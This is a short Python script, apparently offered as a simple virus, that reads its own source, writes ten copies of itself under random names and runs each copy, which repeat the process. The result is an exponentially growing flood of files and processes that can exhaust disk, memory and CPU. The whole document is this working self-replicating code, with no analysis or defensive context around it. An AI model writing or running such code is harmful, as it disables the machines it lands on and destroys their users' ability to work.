import string
import random
import sys
import os
def make_name():
    name = ''
    for i in range(0,20):
        name += random.choice(string.ascii_letters)
    return name
with open(sys.argv[0], 'r') as virus_line:
    virus = virus_line.readlines()
for i in range(0,10):
    virus_name = make_name() + '.py'
    virus_file = open(virus_name, 'w+')
    for line in virus:
        virus_file.write(line)
    os.system(f'python3 {virus_name}')
